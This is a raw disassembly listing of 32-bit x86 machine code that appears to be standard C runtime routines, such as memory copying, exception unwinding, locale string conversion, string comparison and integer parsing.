  4281ef:	mov    eax,DWORD PTR [esp+0x20]
  4281f3:	mov    ebx,DWORD PTR [eax+0x8]
  4281f6:	mov    esi,DWORD PTR [eax+0xc]
  4281f9:	cmp    esi,0xffffffff
  4281fc:	je     0x42822c
  4281fe:	cmp    esi,DWORD PTR [esp+0x24]
  428202:	je     0x42822c
  428204:	lea    esi,[esi+esi*2]
  428207:	mov    ecx,DWORD PTR [ebx+esi*4]
  42820a:	mov    DWORD PTR [esp+0x8],ecx
  42820e:	mov    DWORD PTR [eax+0xc],ecx
  428211:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428216:	jne    0x42822a
  428218:	push   0x101
  42821d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428221:	call   0x428266
  428226:	call   DWORD PTR [ebx+esi*4+0x8]
  42822a:	jmp    0x4281ef
  42822c:	pop    DWORD PTR fs:0x0
  428233:	add    esp,0xc
  428236:	pop    edi
  428237:	pop    esi
  428238:	pop    ebx
  428239:	ret    
  42823a:	xor    eax,eax
  42823c:	mov    ecx,DWORD PTR fs:0x0
  428243:	cmp    DWORD PTR [ecx+0x4],0x4281b0
  42824a:	jne    0x42825c
  42824c:	mov    edx,DWORD PTR [ecx+0xc]
  42824f:	mov    edx,DWORD PTR [edx+0xc]
  428252:	cmp    DWORD PTR [ecx+0x8],edx
  428255:	jne    0x42825c
  428257:	mov    eax,0x1
  42825c:	ret    
  42825d:	push   ebx
  42825e:	push   ecx
  42825f:	mov    ebx,0x45d94c
  428264:	jmp    0x428270
  428266:	push   ebx
  428267:	push   ecx
  428268:	mov    ebx,0x45d94c
  42826d:	mov    ecx,DWORD PTR [ebp+0x8]
  428270:	mov    DWORD PTR [ebx+0x8],ecx
  428273:	mov    DWORD PTR [ebx+0x4],eax
  428276:	mov    DWORD PTR [ebx+0xc],ebp
  428279:	pop    ecx
  42827a:	pop    ebx
  42827b:	ret    0x4
  42827e:	int3   
  42827f:	int3   
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   edi
  428284:	push   esi
  428285:	mov    esi,DWORD PTR [ebp+0xc]
  428288:	mov    ecx,DWORD PTR [ebp+0x10]
  42828b:	mov    edi,DWORD PTR [ebp+0x8]
  42828e:	mov    eax,ecx
  428290:	mov    edx,ecx
  428292:	add    eax,esi
  428294:	cmp    edi,esi
  428296:	jbe    0x4282a0
  428298:	cmp    edi,eax
  42829a:	jb     0x42841c
  4282a0:	test   edi,0x3
  4282a6:	jne    0x4282bc
  4282a8:	shr    ecx,0x2
  4282ab:	and    edx,0x3
  4282ae:	cmp    ecx,0x8
  4282b1:	jb     0x4282dc
  4282b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282b5:	jmp    DWORD PTR [edx*4+0x4283cc]
  4282bc:	mov    eax,edi
  4282be:	mov    edx,0x3
  4282c3:	sub    ecx,0x4
  4282c6:	jb     0x4282d4
  4282c8:	and    eax,0x3
  4282cb:	add    ecx,eax
  4282cd:	jmp    DWORD PTR [eax*4+0x4282e0]
  4282d4:	jmp    DWORD PTR [ecx*4+0x4283dc]
  4282db:	nop
  4282dc:	jmp    DWORD PTR [ecx*4+0x428360]
  4282e3:	nop
  4282e4:	lock add BYTE PTR [edx+0x0],0x1c
  4282e9:	add    DWORD PTR [edx+0x0],0x40
  4282ed:	add    DWORD PTR [edx+0x0],0x23
  4282f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4282f7:	inc    esi
  4282f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4282fe:	add    al,cl
  428300:	jmp    0x28a0b07
  428305:	add    esi,0x3
  428308:	add    edi,0x3
  42830b:	cmp    ecx,0x8
  42830e:	jb     0x4282dc
  428310:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428312:	jmp    DWORD PTR [edx*4+0x4283cc]
  428319:	lea    ecx,[ecx+0x0]
  42831c:	and    edx,ecx
  42831e:	mov    al,BYTE PTR [esi]
  428320:	mov    BYTE PTR [edi],al
  428322:	mov    al,BYTE PTR [esi+0x1]
  428325:	shr    ecx,0x2
  428328:	mov    BYTE PTR [edi+0x1],al
  42832b:	add    esi,0x2
  42832e:	add    edi,0x2
  428331:	cmp    ecx,0x8
  428334:	jb     0x4282dc
  428336:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428338:	jmp    DWORD PTR [edx*4+0x4283cc]
  42833f:	nop
  428340:	and    edx,ecx
  428342:	mov    al,BYTE PTR [esi]
  428344:	mov    BYTE PTR [edi],al
  428346:	add    esi,0x1
  428349:	shr    ecx,0x2
  42834c:	add    edi,0x1
  42834f:	cmp    ecx,0x8
  428352:	jb     0x4282dc
  428354:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428356:	jmp    DWORD PTR [edx*4+0x4283cc]
  42835d:	lea    ecx,[ecx+0x0]
  428360:	ret    
  428361:	add    DWORD PTR [edx+0x0],0xffffffb0
  428365:	add    DWORD PTR [edx+0x0],0xffffffa8
  428369:	add    DWORD PTR [edx+0x0],0xffffffa0
  42836d:	add    DWORD PTR [edx+0x0],0xffffff98
  428371:	add    DWORD PTR [edx+0x0],0xffffff90
  428375:	add    DWORD PTR [edx+0x0],0xffffff88
  428379:	add    DWORD PTR [edx+0x0],0xffffff80
  42837d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428381:	inc    esp
  428382:	mov    fs,esp
  428384:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428388:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42838c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428390:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428394:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283b8:	lea    eax,[ecx*4+0x0]
  4283bf:	add    esi,eax
  4283c1:	add    edi,eax
  4283c3:	jmp    DWORD PTR [edx*4+0x4283cc]
  4283ca:	mov    edi,edi
  4283cc:	fadd   QWORD PTR [ebx-0x7c1bffbe]
  4283d2:	inc    edx
  4283d3:	add    al,dh
  4283d5:	add    DWORD PTR [edx+0x0],0x4
  4283d9:	test   BYTE PTR [edx+0x0],al
  4283dc:	mov    eax,DWORD PTR [ebp+0x8]
  4283df:	pop    esi
  4283e0:	pop    edi
  4283e1:	leave  
  4283e2:	ret    
  4283e3:	nop
  4283e4:	mov    al,BYTE PTR [esi]
  4283e6:	mov    BYTE PTR [edi],al
  4283e8:	mov    eax,DWORD PTR [ebp+0x8]
  4283eb:	pop    esi
  4283ec:	pop    edi
  4283ed:	leave  
  4283ee:	ret    
  4283ef:	nop
  4283f0:	mov    al,BYTE PTR [esi]
  4283f2:	mov    BYTE PTR [edi],al
  4283f4:	mov    al,BYTE PTR [esi+0x1]
  4283f7:	mov    BYTE PTR [edi+0x1],al
  4283fa:	mov    eax,DWORD PTR [ebp+0x8]
  4283fd:	pop    esi
  4283fe:	pop    edi
  4283ff:	leave  
  428400:	ret    
  428401:	lea    ecx,[ecx+0x0]
  428404:	mov    al,BYTE PTR [esi]
  428406:	mov    BYTE PTR [edi],al
  428408:	mov    al,BYTE PTR [esi+0x1]
  42840b:	mov    BYTE PTR [edi+0x1],al
  42840e:	mov    al,BYTE PTR [esi+0x2]
  428411:	mov    BYTE PTR [edi+0x2],al
  428414:	mov    eax,DWORD PTR [ebp+0x8]
  428417:	pop    esi
  428418:	pop    edi
  428419:	leave  
  42841a:	ret    
  42841b:	nop
  42841c:	lea    esi,[ecx+esi*1-0x4]
  428420:	lea    edi,[ecx+edi*1-0x4]
  428424:	test   edi,0x3
  42842a:	jne    0x428450
  42842c:	shr    ecx,0x2
  42842f:	and    edx,0x3
  428432:	cmp    ecx,0x8
  428435:	jb     0x428444
  428437:	std    
  428438:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843a:	cld    
  42843b:	jmp    DWORD PTR [edx*4+0x428568]
  428442:	mov    edi,edi
  428444:	neg    ecx
  428446:	jmp    DWORD PTR [ecx*4+0x428518]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    eax,edi
  428452:	mov    edx,0x3
  428457:	cmp    ecx,0x4
  42845a:	jb     0x428468
  42845c:	and    eax,0x3
  42845f:	sub    ecx,eax
  428461:	jmp    DWORD PTR [eax*4+0x42846c]
  428468:	jmp    DWORD PTR [ecx*4+0x428568]
  42846f:	nop
  428470:	jl     0x4283f6
  428472:	inc    edx
  428473:	add    BYTE PTR [eax-0x37ffbd7c],ah
  428479:	test   BYTE PTR [edx+0x0],al
  42847c:	mov    al,BYTE PTR [esi+0x3]
  42847f:	and    edx,ecx
  428481:	mov    BYTE PTR [edi+0x3],al
  428484:	sub    esi,0x1
  428487:	shr    ecx,0x2
  42848a:	sub    edi,0x1
  42848d:	cmp    ecx,0x8
  428490:	jb     0x428444
  428492:	std    
  428493:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428495:	cld    
  428496:	jmp    DWORD PTR [edx*4+0x428568]
  42849d:	lea    ecx,[ecx+0x0]
  4284a0:	mov    al,BYTE PTR [esi+0x3]
  4284a3:	and    edx,ecx
  4284a5:	mov    BYTE PTR [edi+0x3],al
  4284a8:	mov    al,BYTE PTR [esi+0x2]
  4284ab:	shr    ecx,0x2
  4284ae:	mov    BYTE PTR [edi+0x2],al
  4284b1:	sub    esi,0x2
  4284b4:	sub    edi,0x2
  4284b7:	cmp    ecx,0x8
  4284ba:	jb     0x428444
  4284bc:	std    
  4284bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284bf:	cld    
  4284c0:	jmp    DWORD PTR [edx*4+0x428568]
  4284c7:	nop
  4284c8:	mov    al,BYTE PTR [esi+0x3]
  4284cb:	and    edx,ecx
  4284cd:	mov    BYTE PTR [edi+0x3],al
  4284d0:	mov    al,BYTE PTR [esi+0x2]
  4284d3:	mov    BYTE PTR [edi+0x2],al
  4284d6:	mov    al,BYTE PTR [esi+0x1]
  4284d9:	shr    ecx,0x2
  4284dc:	mov    BYTE PTR [edi+0x1],al
  4284df:	sub    esi,0x3
  4284e2:	sub    edi,0x3
  4284e5:	cmp    ecx,0x8
  4284e8:	jb     0x428444
  4284ee:	std    
  4284ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284f1:	cld    
  4284f2:	jmp    DWORD PTR [edx*4+0x428568]
  4284f9:	lea    ecx,[ecx+0x0]
  4284fc:	sbb    al,0x85
  4284fe:	inc    edx
  4284ff:	add    BYTE PTR [eax*4-0x7ad3ffbe],ah
  428506:	inc    edx
  428507:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  42850e:	inc    edx
  42850f:	add    BYTE PTR [ebp+eax*4+0x42],al
  428513:	add    BYTE PTR [ebp+eax*4+0x42],cl
  428517:	add    BYTE PTR [edi-0x7b],bl
  42851a:	inc    edx
  42851b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428521:	inc    esp
  428522:	(bad)  
  428523:	sbb    al,0x8b
  428525:	inc    esp
  428526:	mov    ds,WORD PTR [eax]
  428528:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42852c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428530:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428534:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428538:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428540:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428548:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428550:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428554:	lea    eax,[ecx*4+0x0]
  42855b:	add    esi,eax
  42855d:	add    edi,eax
  42855f:	jmp    DWORD PTR [edx*4+0x428568]
  428566:	mov    edi,edi
  428568:	js     0x4284ef
  42856a:	inc    edx
  42856b:	add    BYTE PTR [eax-0x6fffbd7b],al
  428571:	test   DWORD PTR [edx+0x0],eax
  428574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428575:	test   DWORD PTR [edx+0x0],eax
  428578:	mov    eax,DWORD PTR [ebp+0x8]
  42857b:	pop    esi
  42857c:	pop    edi
  42857d:	leave  
  42857e:	ret    
  42857f:	nop
  428580:	mov    al,BYTE PTR [esi+0x3]
  428583:	mov    BYTE PTR [edi+0x3],al
  428586:	mov    eax,DWORD PTR [ebp+0x8]
  428589:	pop    esi
  42858a:	pop    edi
  42858b:	leave  
  42858c:	ret    
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    al,BYTE PTR [esi+0x2]
  428599:	mov    BYTE PTR [edi+0x2],al
  42859c:	mov    eax,DWORD PTR [ebp+0x8]
  42859f:	pop    esi
  4285a0:	pop    edi
  4285a1:	leave  
  4285a2:	ret    
  4285a3:	nop
  4285a4:	mov    al,BYTE PTR [esi+0x3]
  4285a7:	mov    BYTE PTR [edi+0x3],al
  4285aa:	mov    al,BYTE PTR [esi+0x2]
  4285ad:	mov    BYTE PTR [edi+0x2],al
  4285b0:	mov    al,BYTE PTR [esi+0x1]
  4285b3:	mov    BYTE PTR [edi+0x1],al
  4285b6:	mov    eax,DWORD PTR [ebp+0x8]
  4285b9:	pop    esi
  4285ba:	pop    edi
  4285bb:	leave  
  4285bc:	ret    
  4285bd:	push   ebp
  4285be:	mov    ebp,esp
  4285c0:	sub    esp,0xc
  4285c3:	mov    eax,ds:0x45d430
  4285c8:	xor    eax,DWORD PTR [ebp+0x4]
  4285cb:	and    BYTE PTR [ebp-0x6],0x0
  4285cf:	push   0x6
  4285d1:	mov    DWORD PTR [ebp-0x4],eax
  4285d4:	lea    eax,[ebp-0xc]
  4285d7:	push   eax
  4285d8:	push   0x1004
  4285dd:	push   DWORD PTR [ebp+0x8]
  4285e0:	call   DWORD PTR ds:0x4290fc
  4285e6:	test   eax,eax
  4285e8:	jne    0x4285ef
  4285ea:	or     eax,0xffffffff
  4285ed:	jmp    0x4285f9
  4285ef:	lea    eax,[ebp-0xc]
  4285f2:	push   eax
  4285f3:	call   0x4288fe
  4285f8:	pop    ecx
  4285f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4285fc:	xor    ecx,DWORD PTR [ebp+0x4]
  4285ff:	call   0x425a0c
  428604:	leave  
  428605:	ret    
  428606:	push   0x38
  428608:	push   0x429fb8
  42860d:	call   0x425340
  428612:	mov    eax,ds:0x45d430
  428617:	xor    eax,DWORD PTR [ebp+0x4]
  42861a:	mov    DWORD PTR [ebp-0x1c],eax
  42861d:	xor    edi,edi
  42861f:	mov    DWORD PTR [ebp-0x20],edi
  428622:	mov    DWORD PTR [ebp-0x24],edi
  428625:	mov    eax,DWORD PTR [ebp+0x14]
  428628:	mov    ebx,DWORD PTR [eax]
  42862a:	mov    DWORD PTR [ebp-0x28],ebx
  42862d:	mov    DWORD PTR [ebp-0x2c],edi
  428630:	mov    eax,DWORD PTR [ebp+0x8]
  428633:	cmp    eax,DWORD PTR [ebp+0xc]
  428636:	je     0x4287af
  42863c:	lea    ecx,[ebp-0x40]
  42863f:	push   ecx
  428640:	push   eax
  428641:	mov    esi,DWORD PTR ds:0x4290c4
  428647:	call   esi
  428649:	test   eax,eax
  42864b:	je     0x42866d
  42864d:	cmp    DWORD PTR [ebp-0x40],0x1
  428651:	jne    0x42866d
  428653:	lea    eax,[ebp-0x40]
  428656:	push   eax
  428657:	push   DWORD PTR [ebp+0xc]
  42865a:	call   esi
  42865c:	test   eax,eax
  42865e:	je     0x42866d
  428660:	cmp    DWORD PTR [ebp-0x40],0x1
  428664:	jne    0x42866d
  428666:	mov    DWORD PTR [ebp-0x2c],0x1
  42866d:	cmp    DWORD PTR [ebp-0x2c],edi
  428670:	je     0x42868c
  428672:	cmp    ebx,0xffffffff
  428675:	je     0x42867b
  428677:	mov    esi,ebx
  428679:	jmp    0x428687
  42867b:	push   DWORD PTR [ebp+0x10]
  42867e:	call   0x425950
  428683:	pop    ecx
  428684:	mov    esi,eax
  428686:	inc    esi
  428687:	mov    DWORD PTR [ebp-0x44],esi
  42868a:	jmp    0x42868f
  42868c:	mov    esi,DWORD PTR [ebp-0x44]
  42868f:	cmp    DWORD PTR [ebp-0x2c],edi
  428692:	jne    0x4286ae
  428694:	push   edi
  428695:	push   edi
  428696:	push   ebx
  428697:	push   DWORD PTR [ebp+0x10]
  42869a:	push   0x1
  42869c:	push   DWORD PTR [ebp+0x8]
  42869f:	call   DWORD PTR ds:0x4290ec
  4286a5:	mov    esi,eax
  4286a7:	mov    DWORD PTR [ebp-0x44],esi
  4286aa:	cmp    esi,edi
  4286ac:	je     0x428706
  4286ae:	mov    DWORD PTR [ebp-0x4],edi
  4286b1:	lea    eax,[esi+esi*1]
  4286b4:	add    eax,0x3
  4286b7:	and    eax,0xfffffffc
  4286ba:	call   0x425390
  4286bf:	mov    DWORD PTR [ebp-0x18],esp
  4286c2:	mov    ebx,esp
  4286c4:	mov    DWORD PTR [ebp-0x48],ebx
  4286c7:	lea    eax,[esi+esi*1]
  4286ca:	push   eax
  4286cb:	push   edi
  4286cc:	push   ebx
  4286cd:	call   0x427c40
  4286d2:	add    esp,0xc
  4286d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286d9:	jmp    0x4286f2
  4286db:	xor    eax,eax
  4286dd:	inc    eax
  4286de:	ret    
  4286df:	mov    esp,DWORD PTR [ebp-0x18]
  4286e2:	call   0x4287d5
  4286e7:	xor    edi,edi
  4286e9:	xor    ebx,ebx
  4286eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ef:	mov    esi,DWORD PTR [ebp-0x44]
  4286f2:	cmp    ebx,edi
  4286f4:	jne    0x428714
  4286f6:	push   esi
  4286f7:	push   0x2
  4286f9:	call   0x426458
  4286fe:	pop    ecx
  4286ff:	pop    ecx
  428700:	mov    ebx,eax
  428702:	cmp    ebx,edi
  428704:	jne    0x42870d
  428706:	xor    eax,eax
  428708:	jmp    0x4287c1
  42870d:	mov    DWORD PTR [ebp-0x24],0x1
  428714:	push   esi
  428715:	push   ebx
  428716:	push   DWORD PTR [ebp-0x28]
  428719:	push   DWORD PTR [ebp+0x10]
  42871c:	push   0x1
  42871e:	push   DWORD PTR [ebp+0x8]
  428721:	call   DWORD PTR ds:0x4290ec
  428727:	test   eax,eax
  428729:	je     0x4287b2
  42872f:	cmp    DWORD PTR [ebp+0x18],edi
  428732:	je     0x428754
  428734:	push   edi
  428735:	push   edi
  428736:	push   DWORD PTR [ebp+0x1c]
  428739:	push   DWORD PTR [ebp+0x18]
  42873c:	push   esi
  42873d:	push   ebx
  42873e:	push   edi
  42873f:	push   DWORD PTR [ebp+0xc]
  428742:	call   DWORD PTR ds:0x42907c
  428748:	test   eax,eax
  42874a:	je     0x4287b2
  42874c:	mov    eax,DWORD PTR [ebp+0x18]
  42874f:	mov    DWORD PTR [ebp-0x20],eax
  428752:	jmp    0x4287b2
  428754:	cmp    DWORD PTR [ebp-0x2c],edi
  428757:	jne    0x42876f
  428759:	push   edi
  42875a:	push   edi
  42875b:	push   edi
  42875c:	push   edi
  42875d:	push   esi
  42875e:	push   ebx
  42875f:	push   edi
  428760:	push   DWORD PTR [ebp+0xc]
  428763:	call   DWORD PTR ds:0x42907c
  428769:	mov    esi,eax
  42876b:	cmp    esi,edi
  42876d:	je     0x4287b2
  42876f:	push   esi
  428770:	push   0x1
  428772:	call   0x426458
  428777:	pop    ecx
  428778:	pop    ecx
  428779:	mov    DWORD PTR [ebp-0x20],eax
  42877c:	cmp    eax,edi
  42877e:	je     0x4287b2
  428780:	push   edi
  428781:	push   edi
  428782:	push   esi
  428783:	push   eax
  428784:	push   esi
  428785:	push   ebx
  428786:	push   edi
  428787:	push   DWORD PTR [ebp+0xc]
  42878a:	call   DWORD PTR ds:0x42907c
  428790:	cmp    eax,edi
  428792:	jne    0x4287a2
  428794:	push   DWORD PTR [ebp-0x20]
  428797:	call   0x425f4a
  42879c:	pop    ecx
  42879d:	mov    DWORD PTR [ebp-0x20],edi
  4287a0:	jmp    0x4287b2
  4287a2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287a6:	je     0x4287b2
  4287a8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287ab:	mov    DWORD PTR [ecx],eax
  4287ad:	jmp    0x4287b2
  4287af:	mov    ebx,DWORD PTR [ebp-0x48]
  4287b2:	cmp    DWORD PTR [ebp-0x24],edi
  4287b5:	je     0x4287be
  4287b7:	push   ebx
  4287b8:	call   0x425f4a
  4287bd:	pop    ecx
  4287be:	mov    eax,DWORD PTR [ebp-0x20]
  4287c1:	lea    esp,[ebp-0x54]
  4287c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287c7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287ca:	call   0x425a0c
  4287cf:	call   0x42537b
  4287d4:	ret    
  4287d5:	push   ebp
  4287d6:	mov    ebp,esp
  4287d8:	sub    esp,0x48
  4287db:	push   ebx
  4287dc:	push   esi
  4287dd:	push   edi
  4287de:	push   0x4
  4287e0:	pop    eax
  4287e1:	call   0x425390
  4287e6:	mov    ebx,esp
  4287e8:	push   0x1c
  4287ea:	lea    eax,[ebp-0x24]
  4287ed:	push   eax
  4287ee:	push   ebx
  4287ef:	call   DWORD PTR ds:0x429108
  4287f5:	test   eax,eax
  4287f7:	je     0x42886a
  4287f9:	mov    edi,DWORD PTR [ebp-0x20]
  4287fc:	lea    eax,[ebp-0x48]
  4287ff:	push   eax
  428800:	call   DWORD PTR ds:0x429048
  428806:	mov    eax,DWORD PTR [ebp-0x44]
  428809:	lea    esi,[eax-0x1]
  42880c:	not    esi
  42880e:	and    esi,ebx
  428810:	sub    esi,eax
  428812:	mov    DWORD PTR [ebp-0x4],eax
  428815:	mov    eax,ds:0x45dac4
  42881a:	mov    ecx,eax
  42881c:	dec    ecx
  42881d:	neg    ecx
  42881f:	sbb    ecx,ecx
  428821:	and    ecx,0xffff1000
  428827:	add    ecx,0x11000
  42882d:	add    ecx,edi
  42882f:	cmp    esi,ecx
  428831:	jb     0x42886a
  428833:	cmp    eax,0x1
  428836:	je     0x428882
  428838:	mov    ebx,edi
  42883a:	mov    edi,0x1000
  42883f:	push   0x1c
  428841:	lea    eax,[ebp-0x24]
  428844:	push   eax
  428845:	push   ebx
  428846:	call   DWORD PTR ds:0x429108
  42884c:	test   eax,eax
  42884e:	je     0x42886a
  428850:	add    ebx,DWORD PTR [ebp-0x18]
  428853:	test   DWORD PTR [ebp-0x14],edi
  428856:	je     0x42883f
  428858:	test   BYTE PTR [ebp-0xf],0x1
  42885c:	mov    ebx,DWORD PTR [ebp-0x24]
  42885f:	je     0x428866
  428861:	xor    eax,eax
  428863:	inc    eax
  428864:	jmp    0x42889e
  428866:	cmp    esi,ebx
  428868:	jae    0x42886e
  42886a:	xor    eax,eax
  42886c:	jmp    0x42889e
  42886e:	push   0x4
  428870:	push   edi
  428871:	push   DWORD PTR [ebp-0x4]
  428874:	push   ebx
  428875:	call   DWORD PTR ds:0x4290cc
  42887b:	mov    eax,ds:0x45dac4
  428880:	jmp    0x428884
  428882:	mov    ebx,esi
  428884:	dec    eax
  428885:	neg    eax
  428887:	sbb    eax,eax
  428889:	and    eax,0x103
  42888e:	lea    ecx,[ebp-0x8]
  428891:	push   ecx
  428892:	inc    eax
  428893:	push   eax
  428894:	push   DWORD PTR [ebp-0x4]
  428897:	push   ebx
  428898:	call   DWORD PTR ds:0x429104
  42889e:	lea    esp,[ebp-0x54]
  4288a1:	pop    edi
  4288a2:	pop    esi
  4288a3:	pop    ebx
  4288a4:	leave  
  4288a5:	ret    
  4288a6:	int3   
  4288a7:	int3   
  4288a8:	int3   
  4288a9:	int3   
  4288aa:	int3   
  4288ab:	int3   
  4288ac:	int3   
  4288ad:	int3   
  4288ae:	int3   
  4288af:	int3   
  4288b0:	push   ebp
  4288b1:	mov    ebp,esp
  4288b3:	push   edi
  4288b4:	push   esi
  4288b5:	push   ebx
  4288b6:	mov    esi,DWORD PTR [ebp+0xc]
  4288b9:	mov    edi,DWORD PTR [ebp+0x8]
  4288bc:	mov    al,0xff
  4288be:	mov    edi,edi
  4288c0:	or     al,al
  4288c2:	je     0x4288f6
  4288c4:	mov    al,BYTE PTR [esi]
  4288c6:	add    esi,0x1
  4288c9:	mov    ah,BYTE PTR [edi]
  4288cb:	add    edi,0x1
  4288ce:	cmp    ah,al
  4288d0:	je     0x4288c0
  4288d2:	sub    al,0x41
  4288d4:	cmp    al,0x1a
  4288d6:	sbb    cl,cl
  4288d8:	and    cl,0x20
  4288db:	add    al,cl
  4288dd:	add    al,0x41
  4288df:	xchg   al,ah
  4288e1:	sub    al,0x41
  4288e3:	cmp    al,0x1a
  4288e5:	sbb    cl,cl
  4288e7:	and    cl,0x20
  4288ea:	add    al,cl
  4288ec:	add    al,0x41
  4288ee:	cmp    al,ah
  4288f0:	je     0x4288c0
  4288f2:	sbb    al,al
  4288f4:	sbb    al,0xff
  4288f6:	movsx  eax,al
  4288f9:	pop    ebx
  4288fa:	pop    esi
  4288fb:	pop    edi
  4288fc:	leave  
  4288fd:	ret    
  4288fe:	push   esi
  4288ff:	push   edi
  428900:	call   0x4251f3
  428905:	mov    edi,DWORD PTR [eax+0x64]
  428908:	cmp    edi,DWORD PTR ds:0x45d58c
  42890e:	je     0x428917
  428910:	call   0x42669f
  428915:	mov    edi,eax
  428917:	mov    esi,DWORD PTR [esp+0xc]
  42891b:	cmp    DWORD PTR [edi+0x28],0x1
  42891f:	movzx  eax,BYTE PTR [esi]
  428922:	jle    0x428932
  428924:	push   0x8
  428926:	push   eax
  428927:	push   edi
  428928:	call   0x428986
  42892d:	add    esp,0xc
  428930:	jmp    0x42893c
  428932:	mov    ecx,DWORD PTR [edi+0x48]
  428935:	movzx  eax,BYTE PTR [ecx+eax*2]
  428939:	and    eax,0x8
  42893c:	test   eax,eax
  42893e:	je     0x428943
  428940:	inc    esi
  428941:	jmp    0x42891b
  428943:	movzx  ecx,BYTE PTR [esi]
  428946:	inc    esi
  428947:	cmp    ecx,0x2d
  42894a:	mov    edx,ecx
  42894c:	je     0x428953
  42894e:	cmp    ecx,0x2b
  428951:	jne    0x428957
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	xor    eax,eax
  428959:	cmp    ecx,0x30
  42895c:	jl     0x428968
  42895e:	cmp    ecx,0x39
  428961:	jg     0x428968
  428963:	sub    ecx,0x30
  428966:	jmp    0x42896b
  428968:	or     ecx,0xffffffff
  42896b:	cmp    ecx,0xffffffff
  42896e:	je     0x42897c
  428970:	lea    eax,[eax+eax*4]
  428973:	lea    eax,[ecx+eax*2]
  428976:	movzx  ecx,BYTE PTR [esi]
  428979:	inc    esi
  42897a:	jmp    0x428959
  42897c:	cmp    edx,0x2d
  42897f:	pop    edi
  428980:	pop    esi
  428981:	jne    0x428985
  428983:	neg    eax
  428985:	ret    
  428986:	push   ebp
  428987:	mov    ebp,esp
  428989:	push   ecx
  42898a:	mov    eax,DWORD PTR [ebp+0xc]
  42898d:	lea    ecx,[eax+0x1]
  428990:	cmp    ecx,0x100
  428996:	mov    ecx,DWORD PTR [ebp+0x8]
  428999:	ja     0x4289a4
  42899b:	mov    ecx,DWORD PTR [ecx+0x48]
  42899e:	movzx  eax,WORD PTR [ecx+eax*2]
  4289a2:	jmp    0x4289f8
  4289a4:	push   esi
  4289a5:	mov    edx,eax
  4289a7:	sar    edx,0x8
  4289aa:	push   edi
  4289ab:	mov    edi,DWORD PTR [ecx+0x48]
  4289ae:	movzx  esi,dl
  4289b1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289b6:	pop    edi
  4289b7:	pop    esi
  4289b8:	je     0x4289c9
  4289ba:	and    BYTE PTR [ebp-0x2],0x0
  4289be:	push   0x2
  4289c0:	mov    BYTE PTR [ebp-0x3],al
  4289c3:	mov    BYTE PTR [ebp-0x4],dl
  4289c6:	pop    eax
  4289c7:	jmp    0x4289d3
  4289c9:	and    BYTE PTR [ebp-0x3],0x0
  4289cd:	mov    BYTE PTR [ebp-0x4],al
  4289d0:	xor    eax,eax
  4289d2:	inc    eax
  4289d3:	push   0x1
  4289d5:	push   DWORD PTR [ecx+0x14]
  4289d8:	push   DWORD PTR [ecx+0x4]
  4289db:	lea    ecx,[ebp+0xe]
  4289de:	push   ecx
  4289df:	push   eax
  4289e0:	lea    eax,[ebp-0x4]
  4289e3:	push   eax
  4289e4:	push   0x1
  4289e6:	call   0x427a68
  4289eb:	add    esp,0x1c
  4289ee:	test   eax,eax
  4289f0:	jne    0x4289f4
  4289f2:	leave  
  4289f3:	ret    
  4289f4:	movzx  eax,WORD PTR [ebp+0xe]
  4289f8:	and    eax,DWORD PTR [ebp+0x10]
  4289fb:	leave  
  4289fc:	ret    
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	mov    eax,DWORD PTR [esp+0x8]
  428a04:	mov    ecx,DWORD PTR [esp+0x10]
  428a08:	or     ecx,eax
